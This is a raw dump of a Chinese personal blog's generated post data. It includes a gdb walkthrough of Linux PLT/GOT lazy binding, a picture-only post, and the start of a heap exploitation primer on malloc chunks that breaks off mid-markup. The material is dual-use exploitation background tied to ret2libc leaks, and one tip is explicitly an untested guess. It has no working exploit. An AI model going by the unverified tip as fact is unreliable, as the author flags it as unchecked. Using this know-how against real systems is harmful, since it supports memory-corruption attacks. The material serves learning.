对于libc中的函数，例如system、puts、write等，需要在程序运行时动态加载到内存中，不同版本的libc加载的位置各不相同，gcc没有办法直接在函数<code>f()</code>的汇编指令中直接call函数<code>x()</code>的真实地址</p>\n<p>​    因此，需要在调用前加入一个寻找函数地址的过程</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">.text<br> ...<br> call f_stub<br> ...<br> <br> ...<br> f_stub:<br> \t 1. find and save function f() entry point in f_stub_addr<br>     2. mov eax, [f_addr]<br>        jmp eax<br> ...<br> <br>.data<br> f_addr  // 存储实际的f()地址<br></code></pre></td></tr></table></figure>\n\n<p>​    如上述过程，f_stub去寻找实际的地址，存储在f_addr中，然后调用它</p>\n<p>​    linux的动态链接过程与上述类似，也是由一个存放外部函数地址数据GOT表（对应f_addr)，和一段函数调用额外的代码PLT表（对应f_stub)</p>\n<p>​    后文会具体分析其机制</p>\n<h5 id=\"实验参考\"><a href=\"#实验参考\" class=\"headerlink\" title=\"实验参考\"></a>实验参考</h5><p><a href=\"https://www.yuque.com/hxfqg9/bin/ug9gx5#5dvaL\">https://www.yuque.com/hxfqg9/bin/ug9gx5#5dvaL</a></p>\n<p><a href=\"https://www.bilibili.com/video/BV1a7411p7zK/?spm_id_from=333.337.search-card.all.click\">https://www.bilibili.com/video/BV1a7411p7zK/?spm_id_from=333.337.search-card.all.click</a></p>\n<h5 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h5><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs C\"><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdio.h&gt;</span></span><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">print_banner</span><span class=\"hljs-params\">()</span><br>&#123;<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Welcome to World of PLT and GOT\\n&quot;</span>);<br>&#125;<br><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">(<span class=\"hljs-type\">void</span>)</span><br>&#123;<br>    print_banner();<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<h5 id=\"编译链接\"><a href=\"#编译链接\" class=\"headerlink\" title=\"编译链接\"></a>编译链接</h5><p><code>gcc -Wall  -g test.c -o test.o -m32</code></p>\n<p><strong>平台</strong>： <strong>kali</strong>-<strong>linux</strong></p>\n<p>开始调试</p>\n<p><strong>首先，在printf函数调用前下一个断点</strong></p>\n<p><img src=\"/img/plt&got/1.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">[-------------------------------------code-------------------------------------]<br>   0x555555555134 &lt;frame_dummy+4&gt;:      jmp    0x5555555550b0 &lt;register_tm_clones&gt;<br>   0x555555555139 &lt;print_banner&gt;:       push   rbp<br>   0x55555555513a &lt;print_banner+1&gt;:     mov    rbp,rsp<br>=&gt; 0x55555555513d &lt;print_banner+4&gt;:     lea    rax,[rip+0xec4]        # 0x555555556008<br>   0x555555555144 &lt;print_banner+11&gt;:    mov    rdi,rax<br>   0x555555555147 &lt;print_banner+14&gt;:    call   0x555555555030 &lt;puts@plt&gt;<br>   0x55555555514c &lt;print_banner+19&gt;:    nop<br>   0x55555555514d &lt;print_banner+20&gt;:    pop    rbp<br></code></pre></td></tr></table></figure>\n\n<p>跳转到了0x555555555030这个地址，gdb对其的标注为&lt;puts@plt&gt;</p>\n<p>查看一下这个地址上的内容</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">gdb-peda$ x/10i 0x555555555030<br>   0x555555555030 &lt;puts@plt&gt;:   jmp    QWORD PTR [rip+0x2fca]        # 0x555555558000 &lt;puts@got[plt]&gt;<br>   0x555555555036 &lt;puts@plt+6&gt;: push   0x0<br>   0x55555555503b &lt;puts@plt+11&gt;:        jmp    0x555555555020<br></code></pre></td></tr></table></figure>\n\n<p>这里第一条指令，jmp 0x555555558000，gdb对其的标注为&lt;puts@got[plt]&gt;，查看这个地址上的值，会发现这个指令在原地跳转：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">gdb-peda$ x/x 0x555555558000 <br>0x555555558000 &lt;puts@got[plt]&gt;: 0x0000555555555036 //这个地址就是上面plt表的第二条指令<br></code></pre></td></tr></table></figure>\n\n<p>相当于什么也没做</p>\n<p>那么根据文章开头的介绍，寻找函数的工作肯定是由第三条指令，<code>jmp 0x555555555020</code>来完成的，这里先不对这个函数进行分析，直接来看结果</p>\n<p><strong>在printf函数后面下断点，重新查看刚才&lt;puts@got[plt]&gt;上的内容</strong></p>\n<p><img src=\"/img/plt&got/2.jpg\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">gdb-peda$ x/x 0x555555558000<br>0x555555558000 &lt;puts@got[plt]&gt;: 0x00007ffff7c75db0<br></code></pre></td></tr></table></figure>\n\n<p>发现这个地方的值变了，而这个改变后的值就是puts函数在libc中的地址</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">gdb-peda$ x/10i 0x00007ffff7c75db0<br>   0x7ffff7c75db0 &lt;__GI__IO_puts&gt;:      push   r14<br>   0x7ffff7c75db2 &lt;__GI__IO_puts+2&gt;:    push   r13<br>   0x7ffff7c75db4 &lt;__GI__IO_puts+4&gt;:    push   r12<br>   0x7ffff7c75db6 &lt;__GI__IO_puts+6&gt;:    mov    r12,rdi<br>   0x7ffff7c75db9 &lt;__GI__IO_puts+9&gt;:    push   rbp<br>   0x7ffff7c75dba &lt;__GI__IO_puts+10&gt;:   push   rbx<br>   0x7ffff7c75dbb &lt;__GI__IO_puts+11&gt;:   sub    rsp,0x10<br>   0x7ffff7c75dbf &lt;__GI__IO_puts+15&gt;:   call   0x7ffff7c28110 &lt;*ABS*+0x99da0@plt&gt;<br>   0x7ffff7c75dc4 &lt;__GI__IO_puts+20&gt;:   mov    r13,QWORD PTR [rip+0x17e04d]        # 0x7ffff7df3e18<br>   0x7ffff7c75dcb &lt;__GI__IO_puts+27&gt;:   mov    rbx,rax<br></code></pre></td></tr></table></figure>\n\n<p><strong>因此可以得出结论</strong></p>\n<p>​    plt表中会先尝试跳转到got表上的函数地址，如果是第一次调用，会进行一次无效跳转，然后去寻找真正的地址填充在got表项上，然后调用；如果是第二次调用，会直接jmp到got表真实的函数地址上</p>\n<p>​    这样就是为什么ret2libc需要使用用已被调用过的函数</p>\n<p><em>tips：</em></p>\n<p><em>linux程序都有一个libc_start_main函数，且会在main函数之前被调用，所以可以在ret2libc时无脑用这个函数(只是个人猜测，并未实际验证)</em></p>\n<p><strong>然后解决如何寻找函数地址的问题</strong>：</p>\n<p>​    在plt表的第二条汇编指令中，push 0x0为寻址函数提供了一个参数，如果打开一个具有多个plt表项的程序，会发现每一项这个值都是不同的：</p>\n<p><img src=\"/img/plt&got/3.jpg\"></p>\n<p>​    这个push的值唯一标识了寻找的函数，</p>\n<p>​    然后再看第三条指令，观察发现这个jmp指令跳转到了plt表的开头（可以在objdump里看到这也是一个plt表项，但是代码与其他表项形式不同）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">gdb-peda$ x/10i 0x555555555020<br>   0x555555555020:      push   QWORD PTR [rip+0x2fca]        # 0x555555557ff0<br>   0x555555555026:      jmp    QWORD PTR [rip+0x2fcc]        # 0x555555557ff8<br></code></pre></td></tr></table></figure>\n\n<p>如果在gdb未开始调试的时候，查看这个jmp的值，是0x0</p>\n<p>而在printf函数前的断点查看，会发现它发生了变化</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">gdb-peda$ x/x 0x555555557ff8<br>0x555555557ff8: 0x00007ffff7fdc080<br><br>gdb-peda$ x/10i 0x00007ffff7fdc080<br>   0x7ffff7fdc080 &lt;_dl_runtime_resolve_xsavec&gt;: push   rbx<br>   0x7ffff7fdc081 &lt;_dl_runtime_resolve_xsavec+1&gt;:       mov    rbx,rsp<br>   0x7ffff7fdc084 &lt;_dl_runtime_resolve_xsavec+4&gt;:       and    rsp,0xffffffffffffffc0<br>   0x7ffff7fdc088 &lt;_dl_runtime_resolve_xsavec+8&gt;:<br>    sub    rsp,QWORD PTR [rip+0x20be1]        # 0x7ffff7ffcc70 &lt;_rtld_global_ro+432&gt;<br>   0x7ffff7fdc08f &lt;_dl_runtime_resolve_xsavec+15&gt;:      mov    QWORD PTR [rsp],rax<br>   0x7ffff7fdc093 &lt;_dl_runtime_resolve_xsavec+19&gt;:      mov    QWORD PTR [rsp+0x8],rcx<br>   0x7ffff7fdc098 &lt;_dl_runtime_resolve_xsavec+24&gt;:      mov    QWORD PTR [rsp+0x10],rdx<br>   0x7ffff7fdc09d &lt;_dl_runtime_resolve_xsavec+29&gt;:      mov    QWORD PTR [rsp+0x18],rsi<br>   0x7ffff7fdc0a2 &lt;_dl_runtime_resolve_xsavec+34&gt;:      mov    QWORD PTR [rsp+0x20],rdi<br>   0x7ffff7fdc0a7 &lt;_dl_runtime_resolve_xsavec+39&gt;:      mov    QWORD PTR [rsp+0x28],r8<br><br></code></pre></td></tr></table></figure>\n\n<p>这个函数为<code>_dl_runtime_resolve(link_map_obj, reloc_index)</code>，此处不在对其具体分析，其用处即为寻找编号为<code>reloc_index</code>的函数</p>\n<h5 id=\"整体流程\"><a href=\"#整体流程\" class=\"headerlink\" title=\"整体流程\"></a>整体流程</h5><p><strong>第一次调用</strong></p>\n<p><img src=\"/img/plt&got/4.jpg\"></p>\n<p><strong>第二次调用</strong></p>\n<p><img src=\"/img/plt&got/5.jpg\"></p>\n","site":{"data":{}},"more":"<p>Linux 动态链接与延迟绑定机制</p>\n<p><strong>Q：</strong></p>\n<ol>\n<li>为什么ret2libc泄露基址时要选择已经使用过的函数？</li>\n<li>何为延迟绑定？</li>\n</ol>\n<h2 id=\"Linux-动态链接与延迟绑定机制\"><a href=\"#Linux-动态链接与延迟绑定机制\" class=\"headerlink\" title=\"Linux 动态链接与延迟绑定机制\"></a>Linux 动态链接与延迟绑定机制</h2><p>​    假设，写了一个函数<code>f()</code>，调用了glibc中函数<code>x()</code>，在可执行文件是如何编译的？</p>\n<p>​    对于libc中的函数，例如system、puts、write等，需要在程序运行时动态加载到内存中，不同版本的libc加载的位置各不相同，gcc没有办法直接在函数<code>f()</code>的汇编指令中直接call函数<code>x()</code>的真实地址</p>\n<p>​    因此，需要在调用前加入一个寻找函数地址的过程</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">.text<br> ...<br> call f_stub<br> ...<br> <br> ...<br> f_stub:<br> \t 1. find and save function f() entry point in f_stub_addr<br>     2. mov eax, [f_addr]<br>        jmp eax<br> ...<br> <br>.data<br> f_addr  // 存储实际的f()地址<br></code></pre></td></tr></table></figure>\n\n<p>​    如上述过程，f_stub去寻找实际的地址，存储在f_addr中，然后调用它</p>\n<p>​    linux的动态链接过程与上述类似，也是由一个存放外部函数地址数据GOT表（对应f_addr)，和一段函数调用额外的代码PLT表（对应f_stub)</p>\n<p>​    后文会具体分析其机制</p>\n<h5 id=\"实验参考\"><a href=\"#实验参考\" class=\"headerlink\" title=\"实验参考\"></a>实验参考</h5><p><a href=\"https://www.yuque.com/hxfqg9/bin/ug9gx5#5dvaL\">https://www.yuque.com/hxfqg9/bin/ug9gx5#5dvaL</a></p>\n<p><a href=\"https://www.bilibili.com/video/BV1a7411p7zK/?spm_id_from=333.337.search-card.all.click\">https://www.bilibili.com/video/BV1a7411p7zK/?spm_id_from=333.337.search-card.all.click</a></p>\n<h5 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h5><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs C\"><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdio.h&gt;</span></span><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">print_banner</span><span class=\"hljs-params\">()</span><br>&#123;<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Welcome to World of PLT and GOT\\n&quot;</span>);<br>&#125;<br><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">(<span class=\"hljs-type\">void</span>)</span><br>&#123;<br>    print_banner();<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<h5 id=\"编译链接\"><a href=\"#编译链接\" class=\"headerlink\" title=\"编译链接\"></a>编译链接</h5><p><code>gcc -Wall  -g test.c -o test.o -m32</code></p>\n<p><strong>平台</strong>： <strong>kali</strong>-<strong>linux</strong></p>\n<p>开始调试</p>\n<p><strong>首先，在printf函数调用前下一个断点</strong></p>\n<p><img src=\"/img/plt&got/1.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">[-------------------------------------code-------------------------------------]<br>   0x555555555134 &lt;frame_dummy+4&gt;:      jmp    0x5555555550b0 &lt;register_tm_clones&gt;<br>   0x555555555139 &lt;print_banner&gt;:       push   rbp<br>   0x55555555513a &lt;print_banner+1&gt;:     mov    rbp,rsp<br>=&gt; 0x55555555513d &lt;print_banner+4&gt;:     lea    rax,[rip+0xec4]        # 0x555555556008<br>   0x555555555144 &lt;print_banner+11&gt;:    mov    rdi,rax<br>   0x555555555147 &lt;print_banner+14&gt;:    call   0x555555555030 &lt;puts@plt&gt;<br>   0x55555555514c &lt;print_banner+19&gt;:    nop<br>   0x55555555514d &lt;print_banner+20&gt;:    pop    rbp<br></code></pre></td></tr></table></figure>\n\n<p>跳转到了0x555555555030这个地址，gdb对其的标注为&lt;puts@plt&gt;</p>\n<p>查看一下这个地址上的内容</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">gdb-peda$ x/10i 0x555555555030<br>   0x555555555030 &lt;puts@plt&gt;:   jmp    QWORD PTR [rip+0x2fca]        # 0x555555558000 &lt;puts@got[plt]&gt;<br>   0x555555555036 &lt;puts@plt+6&gt;: push   0x0<br>   0x55555555503b &lt;puts@plt+11&gt;:        jmp    0x555555555020<br></code></pre></td></tr></table></figure>\n\n<p>这里第一条指令，jmp 0x555555558000，gdb对其的标注为&lt;puts@got[plt]&gt;，查看这个地址上的值，会发现这个指令在原地跳转：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">gdb-peda$ x/x 0x555555558000 <br>0x555555558000 &lt;puts@got[plt]&gt;: 0x0000555555555036 //这个地址就是上面plt表的第二条指令<br></code></pre></td></tr></table></figure>\n\n<p>相当于什么也没做</p>\n<p>那么根据文章开头的介绍，寻找函数的工作肯定是由第三条指令，<code>jmp 0x555555555020</code>来完成的，这里先不对这个函数进行分析，直接来看结果</p>\n<p><strong>在printf函数后面下断点，重新查看刚才&lt;puts@got[plt]&gt;上的内容</strong></p>\n<p><img src=\"/img/plt&got/2.jpg\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">gdb-peda$ x/x 0x555555558000<br>0x555555558000 &lt;puts@got[plt]&gt;: 0x00007ffff7c75db0<br></code></pre></td></tr></table></figure>\n\n<p>发现这个地方的值变了，而这个改变后的值就是puts函数在libc中的地址</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">gdb-peda$ x/10i 0x00007ffff7c75db0<br>   0x7ffff7c75db0 &lt;__GI__IO_puts&gt;:      push   r14<br>   0x7ffff7c75db2 &lt;__GI__IO_puts+2&gt;:    push   r13<br>   0x7ffff7c75db4 &lt;__GI__IO_puts+4&gt;:    push   r12<br>   0x7ffff7c75db6 &lt;__GI__IO_puts+6&gt;:    mov    r12,rdi<br>   0x7ffff7c75db9 &lt;__GI__IO_puts+9&gt;:    push   rbp<br>   0x7ffff7c75dba &lt;__GI__IO_puts+10&gt;:   push   rbx<br>   0x7ffff7c75dbb &lt;__GI__IO_puts+11&gt;:   sub    rsp,0x10<br>   0x7ffff7c75dbf &lt;__GI__IO_puts+15&gt;:   call   0x7ffff7c28110 &lt;*ABS*+0x99da0@plt&gt;<br>   0x7ffff7c75dc4 &lt;__GI__IO_puts+20&gt;:   mov    r13,QWORD PTR [rip+0x17e04d]        # 0x7ffff7df3e18<br>   0x7ffff7c75dcb &lt;__GI__IO_puts+27&gt;:   mov    rbx,rax<br></code></pre></td></tr></table></figure>\n\n<p><strong>因此可以得出结论</strong></p>\n<p>​    plt表中会先尝试跳转到got表上的函数地址，如果是第一次调用，会进行一次无效跳转，然后去寻找真正的地址填充在got表项上，然后调用；如果是第二次调用，会直接jmp到got表真实的函数地址上</p>\n<p>​    这样就是为什么ret2libc需要使用用已被调用过的函数</p>\n<p><em>tips：</em></p>\n<p><em>linux程序都有一个libc_start_main函数，且会在main函数之前被调用，所以可以在ret2libc时无脑用这个函数(只是个人猜测，并未实际验证)</em></p>\n<p><strong>然后解决如何寻找函数地址的问题</strong>：</p>\n<p>​    在plt表的第二条汇编指令中，push 0x0为寻址函数提供了一个参数，如果打开一个具有多个plt表项的程序，会发现每一项这个值都是不同的：</p>\n<p><img src=\"/img/plt&got/3.jpg\"></p>\n<p>​    这个push的值唯一标识了寻找的函数，</p>\n<p>​    然后再看第三条指令，观察发现这个jmp指令跳转到了plt表的开头（可以在objdump里看到这也是一个plt表项，但是代码与其他表项形式不同）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">gdb-peda$ x/10i 0x555555555020<br>   0x555555555020:      push   QWORD PTR [rip+0x2fca]        # 0x555555557ff0<br>   0x555555555026:      jmp    QWORD PTR [rip+0x2fcc]        # 0x555555557ff8<br></code></pre></td></tr></table></figure>\n\n<p>如果在gdb未开始调试的时候，查看这个jmp的值，是0x0</p>\n<p>而在printf函数前的断点查看，会发现它发生了变化</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">gdb-peda$ x/x 0x555555557ff8<br>0x555555557ff8: 0x00007ffff7fdc080<br><br>gdb-peda$ x/10i 0x00007ffff7fdc080<br>   0x7ffff7fdc080 &lt;_dl_runtime_resolve_xsavec&gt;: push   rbx<br>   0x7ffff7fdc081 &lt;_dl_runtime_resolve_xsavec+1&gt;:       mov    rbx,rsp<br>   0x7ffff7fdc084 &lt;_dl_runtime_resolve_xsavec+4&gt;:       and    rsp,0xffffffffffffffc0<br>   0x7ffff7fdc088 &lt;_dl_runtime_resolve_xsavec+8&gt;:<br>    sub    rsp,QWORD PTR [rip+0x20be1]        # 0x7ffff7ffcc70 &lt;_rtld_global_ro+432&gt;<br>   0x7ffff7fdc08f &lt;_dl_runtime_resolve_xsavec+15&gt;:      mov    QWORD PTR [rsp],rax<br>   0x7ffff7fdc093 &lt;_dl_runtime_resolve_xsavec+19&gt;:      mov    QWORD PTR [rsp+0x8],rcx<br>   0x7ffff7fdc098 &lt;_dl_runtime_resolve_xsavec+24&gt;:      mov    QWORD PTR [rsp+0x10],rdx<br>   0x7ffff7fdc09d &lt;_dl_runtime_resolve_xsavec+29&gt;:      mov    QWORD PTR [rsp+0x18],rsi<br>   0x7ffff7fdc0a2 &lt;_dl_runtime_resolve_xsavec+34&gt;:      mov    QWORD PTR [rsp+0x20],rdi<br>   0x7ffff7fdc0a7 &lt;_dl_runtime_resolve_xsavec+39&gt;:      mov    QWORD PTR [rsp+0x28],r8<br><br></code></pre></td></tr></table></figure>\n\n<p>这个函数为<code>_dl_runtime_resolve(link_map_obj, reloc_index)</code>，此处不在对其具体分析，其用处即为寻找编号为<code>reloc_index</code>的函数</p>\n<h5 id=\"整体流程\"><a href=\"#整体流程\" class=\"headerlink\" title=\"整体流程\"></a>整体流程</h5><p><strong>第一次调用</strong></p>\n<p><img src=\"/img/plt&got/4.jpg\"></p>\n<p><strong>第二次调用</strong></p>\n<p><img src=\"/img/plt&got/5.jpg\"></p>\n"},{"title":"可爱的小黄鸡","index_img":"/img/basic/1.jpg","date":"2022-11-16T07:13:16.000Z","excerpt":"可爱的小黄鸡 0v0","_content":"\n可爱的小黄鸡 0v0\n\n![](/img/basic/1.jpg)\n![](/img/basic/2.jpg)\n![](/img/basic/3.jpg)\n![](/img/basic/4.jpg)\n![](/img/basic/5.jpg)\n![](/img/basic/6.jpg)\n![](/img/basic/7.jpg)\n![](/img/basic/9.jpg)\n![](/img/basic/1.gif)\n![](/img/basic/2.gif)","source":"_posts/小黄鸡.md","raw":"---\ntitle: 可爱的小黄鸡\ntags: [Others]\nindex_img: /img/basic/1.jpg\ndate: 2022-11-16 15:13:16\nexcerpt: 可爱的小黄鸡 0v0\n---\n\n可爱的小黄鸡 0v0\n\n![](/img/basic/1.jpg)\n![](/img/basic/2.jpg)\n![](/img/basic/3.jpg)\n![](/img/basic/4.jpg)\n![](/img/basic/5.jpg)\n![](/img/basic/6.jpg)\n![](/img/basic/7.jpg)\n![](/img/basic/9.jpg)\n![](/img/basic/1.gif)\n![](/img/basic/2.gif)","slug":"小黄鸡","published":1,"updated":"2022-11-16T16:13:22.226Z","_id":"clajrmeg6000fkgufcovgdjgl","comments":1,"layout":"post","photos":[],"link":"","content":"<p>可爱的小黄鸡 0v0</p>\n<p><img src=\"/img/basic/1.jpg\"><br><img src=\"/img/basic/2.jpg\"><br><img src=\"/img/basic/3.jpg\"><br><img src=\"/img/basic/4.jpg\"><br><img src=\"/img/basic/5.jpg\"><br><img src=\"/img/basic/6.jpg\"><br><img src=\"/img/basic/7.jpg\"><br><img src=\"/img/basic/9.jpg\"><br><img src=\"/img/basic/1.gif\"><br><img src=\"/img/basic/2.gif\"></p>\n","site":{"data":{}},"more":"<p>可爱的小黄鸡 0v0</p>\n<p><img src=\"/img/basic/1.jpg\"><br><img src=\"/img/basic/2.jpg\"><br><img src=\"/img/basic/3.jpg\"><br><img src=\"/img/basic/4.jpg\"><br><img src=\"/img/basic/5.jpg\"><br><img src=\"/img/basic/6.jpg\"><br><img src=\"/img/basic/7.jpg\"><br><img src=\"/img/basic/9.jpg\"><br><img src=\"/img/basic/1.gif\"><br><img src=\"/img/basic/2.gif\"></p>\n"},{"title":"Heap Exploitation","date":"2022-11-18T04:19:00.000Z","excerpt":"basic knowledge in heap exploitation","_content":"\n### malloc\n\n```c++\n#include <stdlib.h>\nvoid *malloc(size_t size);\n```\n\nsize = 0时，返回系统允许的最小内存块\n\n32位系统下malloc(0)分配8Bytes，64位分配16Bytes\n\n\n\n### brk\n\n堆段的起点和终点标识符：start_brk、brk（program brk)\n\n不开ASLR，初始时都指向bss段末尾（end_data)\n\n开启ASLR，会随机向后偏移一段距离\n\n`brk()`函数作用为抬高brk指针，获取一段heap\n\n程序开始时heap大小为0，第一次申请堆的时候，通过brk()向系统申请一段内存  **main_arena**，后面malloc都会从main_arena中申请内存\n\n\n\n\n\n### chunk\n\n```C\nstruct malloc chunk{\n    INTERNAL_SIZE_T mchunk_prev_size; /* Size of previous chunk (if free).*/\n    INTERNAL_SIZE_T mchunk_size;      /* Size in bytes，including overhead.*/\n    struct malloc chunk* fd;          /* double links -- used only if free.*/\n    struct malloc chunk* bk;          /* Only used for large blocks: pointer to next larger size. */\n    struct malloc_chunk* fd_nextsize; /* double links -- used only if free.*/\n    struct malloc chunk* bk_nextsize;\n}\ntypedef struct malloc_chunk* mchunkptr;\n```\n\n\n\n#### allocated chunk\n\n`prevsize `：如果前一个chunk是free的***（这里指的是内存中的前一个，而不是freelist中的前一个）***，它代表前一个chunk的大小；如果不是free的，存储前一个的user data 。32位中是4字节，64位中是8字节\n\n`size`：此chunk大小。最低3位用来存储N（chunk 在 non_main_arena里为1）、M（chunk是mmap得到的为1）、P（前一个chunk已被分配为1 对应prevsize），因此size是8字节对齐的\n\n`userdata`：数据\n\n（下一个chunk的prevsize也会存储userdata）\n\n```C\n#define request2size(req) ...   //可以计算申请字节需要实际分配多少字节\n```\n\nchunk是在prevsize开始，但是malloc返回的指针指向userdata\n\n\n\n#### free chunk \n\n`prevsize`：上一个chunk的userdata，因为上一个如果也是free，则会被合并（fast bin中可能会例外，后面会提及）\n\n`size`：同上\n\n`fd bk`：（在freelist中的）前一个/后一个chunk\n\n\n\n#### top chunk\n\n位于arena顶部。在所有bin都没有满足需求的chunk时，从top chunk切割\n\ntop chunk 不够，在main_arena中会用brk扩张top chunk，non_main_arena中，用mmap分配新的堆\n\n\n\n### Bin\n\n<div class=\"mxgraph\" style=\"max-width:100%;border:1px solid transparent;\" data-mxgraph=\"{&quot;highlight&quot;:&quot;#0000ff&quot;,&quot;nav&quot;:true,&quot;resize&quot;:true,&quot;toolbar&quot;:&quot;zoom layers tags 